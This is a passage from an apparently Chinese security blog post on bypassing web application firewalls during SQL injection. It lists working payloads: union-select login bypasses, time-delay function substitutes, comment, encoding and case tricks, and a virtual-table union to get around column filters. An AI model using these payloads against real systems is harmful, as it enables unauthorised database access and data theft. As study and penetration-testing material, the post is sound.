<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=admin&apos; union select 1,2,3 from admin_user `&amp;pass=admin1234</span><br></pre></td></tr></table></figure>

<p>拼接后的SQL语句为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username = &apos;admin&apos; union select 1,2,3 from admin_user `&apos; and password = &apos;admin1234&apos;</span><br></pre></td></tr></table></figure>

<p>其中 <code>&#39; and password = &#39;admin1234&#39;</code> 都为 admin_user 的别名（as可以省略）</p>
<ul>
<li><p>在盲注中的利用</p>
<blockquote>
<p>寻找需要用到列名的地方，如 ：order by 、having</p>
<p>可以使用 <code>@</code> 来避免找不到 colunm 的问题</p>
</blockquote>
</li>
</ul>
<h2 id="等价函数变量绕过"><a href="#等价函数变量绕过" class="headerlink" title="等价函数变量绕过"></a>等价函数变量绕过</h2><h3 id="hex-、bin-gt-ascii"><a href="#hex-、bin-gt-ascii" class="headerlink" title="hex()、bin()  ==&gt;  ascii()"></a>hex()、bin()  ==&gt;  ascii()</h3><h3 id="sleep-gt-benchmark-gt-get-lock"><a href="#sleep-gt-benchmark-gt-get-lock" class="headerlink" title="sleep()  ==&gt;  benchmark()  ==&gt;get_lock()"></a>sleep()  ==&gt;  benchmark()  ==&gt;get_lock()</h3><ul>
<li>BENCHMARK(count,expr)<ul>
<li>BENCHMARK()函数，重复countTimes次执行表达式expr,执行的时间长了，也达到了sleep的作用</li>
</ul>
</li>
<li>在sqlsever 中用 waitfor delay</li>
<li>在Oracle 中用 DBMS_PIPE.RECEIVE_MESSAGE()函数和CASEWHEN„THEN„语句</li>
</ul>
<h3 id="concat-ws-gt-group-concat"><a href="#concat-ws-gt-group-concat" class="headerlink" title="concat_ws()  ==&gt;  group_concat()"></a>concat_ws()  ==&gt;  group_concat()</h3><h3 id="mid-、substr-gt-substring"><a href="#mid-、substr-gt-substring" class="headerlink" title="mid() 、substr()  ==&gt;  substring()"></a>mid() 、substr()  ==&gt;  substring()</h3><h3 id="user-gt-user"><a href="#user-gt-user" class="headerlink" title="@@user ==&gt;  user()"></a>@@user ==&gt;  user()</h3><h3 id="datadir-gt-datadir"><a href="#datadir-gt-datadir" class="headerlink" title="@@datadir  ==&gt; datadir()"></a>@@datadir  ==&gt; datadir()</h3><h3 id="version-gt-version"><a href="#version-gt-version" class="headerlink" title="@@version  ==&gt;  version()"></a>@@version  ==&gt;  version()</h3><h2 id="函数后添加注释"><a href="#函数后添加注释" class="headerlink" title="函数后添加注释"></a>函数后添加注释</h2><blockquote>
<p>函数被过滤时，在函数名与括号间添加空格或者注释绕过过滤</p>
</blockquote>
<ul>
<li>concat/**/()</li>
</ul>
<h2 id="过滤字母"><a href="#过滤字母" class="headerlink" title="过滤字母"></a>过滤字母</h2><blockquote>
<p>CONV()函数的目的是在不同的数值基数之间进行数字转换。</p>
<p>该函数返回值N从from_base到to_base转换的字符串</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select conv(10,10,36);</span><br><span class="line">+----------------+</span><br><span class="line">| conv(10,10,36) |</span><br><span class="line">+----------------+</span><br><span class="line">| A              |</span><br><span class="line">+----------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select lower(conv(10,10,36));</span><br><span class="line">+-----------------------+</span><br><span class="line">| lower(conv(10,10,36)) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| a                     |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure>

<h2 id="过滤from"><a href="#过滤from" class="headerlink" title="过滤from"></a>过滤from</h2><ul>
<li>用 from.  代替</li>
</ul>
<h2 id="表名或字段名是保留字"><a href="#表名或字段名是保留字" class="headerlink" title="表名或字段名是保留字"></a>表名或字段名是保留字</h2><ul>
<li><p>使用点号连接表名和字段名</p>
<p><code>table_name.column_name</code></p>
</li>
<li><p>用反引号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`table_name`</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="字段名过滤"><a href="#字段名过滤" class="headerlink" title="字段名过滤"></a>字段名过滤</h2><blockquote>
<p>将一个虚表和当前表联合</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pro_id=-1 union select 1,a.4,3,4 from (select 1,2,3,4 from dual union select * from product_2017ctf)a limit 3,1;</span><br></pre></td></tr></table></figure>

<h2 id="符号替代"><a href="#符号替代" class="headerlink" title="符号替代"></a>符号替代</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">or   ||</span><br><span class="line">and  &amp;&amp;</span><br></pre></td></tr></table></figure>

<h2 id="00"><a href="#00" class="headerlink" title="%00"></a>%00</h2><blockquote>
<p>MYSQL对%00不会截断</p>
</blockquote>
<p><code>se%00lect</code></p>
<h2 id="-2"><a href="#-2" class="headerlink" title="%"></a>%</h2><blockquote>
<p>单一%号，在asp+iis中会被忽略</p>
</blockquote>
<p><code>sel%ect</code></p>
<h2 id="lt-gt"><a href="#lt-gt" class="headerlink" title="&lt;&gt;"></a><code>&lt;&gt;</code></h2><blockquote>
<p>Linux</p>
</blockquote>
<p><code>sel&lt;&gt;ect</code></p>
<h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><p>将关键词替换为空（删除）</p>
<h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><p>php中preg_match函数没有加/i参数</p>
<h2 id="常见bypass"><a href="#常见bypass" class="headerlink" title="常见bypass"></a>常见bypass</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=1+(UnIoN)+(SelECT)+</span><br><span class="line">id=1+(UnIoN+SeLeCT)+</span><br><span class="line">id=1+(UnI)(oN)+(SeL)(EcT)</span><br><span class="line">id=1+’UnI’’On’+’SeL’’ECT’ &lt;-MySQL only</span><br><span class="line">id=1+’UnI’||’on’+SeLeCT’ &lt;-MSSQL only</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://www.k0rz3n.com/2017/11/21/mysqltrick/" target="_blank" rel="noopener">link1</a></li>
<li>文中两处链接</li>
</ul>
<h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><blockquote>
<ol>
<li>博主初衷为分享网络安全知识，请勿利用技术做出任何危害网络安全的行为，否则后果自负，与本人无关！</li>
<li>部分学习内容来自网络，回馈网络，如涉及版权问题，请联系删除  orz </li>
</ol>
</blockquote>
</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="https://passenger-amao.github.io">AMao</a></p><p> <span>Link:  </span><a href="https://passenger-amao.github.io/2020/07/23/SQL%20%E6%B3%A8%E5%85%A5%E7%BB%95%20WAF%20%E6%80%9D%E8%B7%AF/">https://passenger-amao.github.io/2020/07/23/SQL%20%E6%B3%A8%E5%85%A5%E7%BB%95%20WAF%20%E6%80%9D%E8%B7%AF/</a></p><p> <span>Copyright:  </span><span>本站所有文章均采用 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">署名-非商业性使用-相同方式共享 4.0 国际(CC BY-NC-SA 4.0)</a> 许可协议。转载请注明出处！</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2020/08/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" title="内网安全基础"><span>< PreviousPost</span><br><span class="prevTitle">内网安全基础</span></a><a class="nextSlogan" href="/2020/07/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="Web渗透测试之信息收集详细指南"><span>NextPost ></span><br><span class="nextTitle">Web渗透测试之信息收集详细指南</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo" target="_blank" rel="noopener"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-注入绕-WAF-思路"><span class="toc-number">1.</span> <span class="toc-text">SQL 注入绕 WAF 思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#编码绕过"><span class="toc-number">1.1.</span> <span class="toc-text">编码绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ASCII"><span class="toc-number">1.1.1.</span> <span class="toc-text">ASCII</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hex"><span class="toc-number">1.1.2.</span> <span class="toc-text">Hex</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unicode编码"><span class="toc-number">1.1.3.</span> <span class="toc-text">Unicode编码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#单引号"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">单引号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#空格"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">空格</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#左括号"><span class="toc-number">1.1.3.3.</span> <span class="toc-text">左括号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#右括号"><span class="toc-number">1.1.3.4.</span> <span class="toc-text">右括号</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URL编码"><span class="toc-number">1.1.4.</span> <span class="toc-text">URL编码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#order-by-过滤"><span class="toc-number">1.2.</span> <span class="toc-text">order by 过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hex-绕过引号过滤"><span class="toc-number">1.3.</span> <span class="toc-text">Hex 绕过引号过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#等号过滤"><span class="toc-number">1.4.</span> <span class="toc-text">等号过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用like、in替换"><span class="toc-number">1.4.1.</span> <span class="toc-text">使用like、in替换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lt-gt-替代等号构造真值"><span class="toc-number">1.4.2.</span> <span class="toc-text">&lt; &gt; 替代等号构造真值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#REGEXP代替"><span class="toc-number">1.4.3.</span> <span class="toc-text">REGEXP代替=</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#逗号绕过"><span class="toc-number">1.5.</span> <span class="toc-text">逗号绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#substr-逗号绕过"><span class="toc-number">1.5.1.</span> <span class="toc-text">substr()逗号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#limit-逗号绕过"><span class="toc-number">1.5.2.</span> <span class="toc-text">limit 逗号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其他"><span class="toc-number">1.5.3.</span> <span class="toc-text">其他</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过比较符号"><span class="toc-number">1.6.</span> <span class="toc-text">绕过比较符号</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#greatest"><span class="toc-number">1.6.1.</span> <span class="toc-text">greatest()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#between"><span class="toc-number">1.6.2.</span> <span class="toc-text">between</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#空格绕过"><span class="toc-number">1.7.</span> <span class="toc-text">空格绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#括号"><span class="toc-number">1.7.1.</span> <span class="toc-text">括号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">1.7.2.</span> <span class="toc-text">/**/</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1"><span class="toc-number">1.7.3.</span> <span class="toc-text">/*1*/</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0d、-0a、-0c、-0b、-a0"><span class="toc-number">1.7.4.</span> <span class="toc-text">%0d、%0a、%0c、%0b、%a0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-1"><span class="toc-number">1.7.5.</span> <span class="toc-text">+</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TAB"><span class="toc-number">1.7.6.</span> <span class="toc-text">TAB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#两个括号"><span class="toc-number">1.7.7.</span> <span class="toc-text">两个括号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#编码"><span class="toc-number">1.7.8.</span> <span class="toc-text">编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1e0-和-1-0"><span class="toc-number">1.7.9.</span> <span class="toc-text">1e0 和 1.0</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#N-绕过NULL"><span class="toc-number">1.8.</span> <span class="toc-text">\N 绕过NULL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#id-与-from-之间的空格绕过"><span class="toc-number">1.9.</span> <span class="toc-text">id 与 from 之间的空格绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内联注释绕过"><span class="toc-number">1.10.</span> <span class="toc-text">内联注释绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#拆分字符串绕过"><span class="toc-number">1.11.</span> <span class="toc-text">+ - . 拆分字符串绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#宽字节注入绕过"><span class="toc-number">1.12.</span> <span class="toc-text">宽字节注入绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常见注释"><span class="toc-number">1.13.</span> <span class="toc-text">常见注释</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#注释绕过"><span class="toc-number">1.14.</span> <span class="toc-text">注释绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#闭合SQL语句"><span class="toc-number">1.14.1.</span> <span class="toc-text">闭合SQL语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#反引号"><span class="toc-number">1.14.2.</span> <span class="toc-text">反引号</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#等价函数变量绕过"><span class="toc-number">1.15.</span> <span class="toc-text">等价函数变量绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hex-、bin-gt-ascii"><span class="toc-number">1.15.1.</span> <span class="toc-text">hex()、bin()  ==&gt;  ascii()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sleep-gt-benchmark-gt-get-lock"><span class="toc-number">1.15.2.</span> <span class="toc-text">sleep()  ==&gt;  benchmark()  ==&gt;get_lock()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#concat-ws-gt-group-concat"><span class="toc-number">1.15.3.</span> <span class="toc-text">concat_ws()  ==&gt;  group_concat()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mid-、substr-gt-substring"><span class="toc-number">1.15.4.</span> <span class="toc-text">mid() 、substr()  ==&gt;  substring()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#user-gt-user"><span class="toc-number">1.15.5.</span> <span class="toc-text">@@user ==&gt;  user()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#datadir-gt-datadir"><span class="toc-number">1.15.6.</span> <span class="toc-text">@@datadir  ==&gt; datadir()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#version-gt-version"><span class="toc-number">1.15.7.</span> <span class="toc-text">@@version  ==&gt;  version()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#函数后添加注释"><span class="toc-number">1.16.</span> <span class="toc-text">函数后添加注释</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过滤字母"><span class="toc-number">1.17.</span> <span class="toc-text">过滤字母</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过滤from"><span class="toc-number">1.18.</span> <span class="toc-text">过滤from</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#表名或字段名是保留字"><span class="toc-number">1.19.</span> <span class="toc-text">表名或字段名是保留字</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#字段名过滤"><span class="toc-number">1.20.</span> <span class="toc-text">字段名过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#符号替代"><span class="toc-number">1.21.</span> <span class="toc-text">符号替代</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#00"><span class="toc-number">1.22.</span> <span class="toc-text">%00</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#-2"><span class="toc-number">1.23.</span> <span class="toc-text">%</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lt-gt"><span class="toc-number">1.24.</span> <span class="toc-text">&lt;&gt;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#双写绕过"><span class="toc-number">1.25.</span> <span class="toc-text">双写绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#大小写绕过"><span class="toc-number">1.26.</span> <span class="toc-text">大小写绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常见bypass"><span class="toc-number">1.27.</span> <span class="toc-text">常见bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">1.28.</span> <span class="toc-text">参考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#声明"><span class="toc-number">1.29.</span> <span class="toc-text">声明</span></a></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>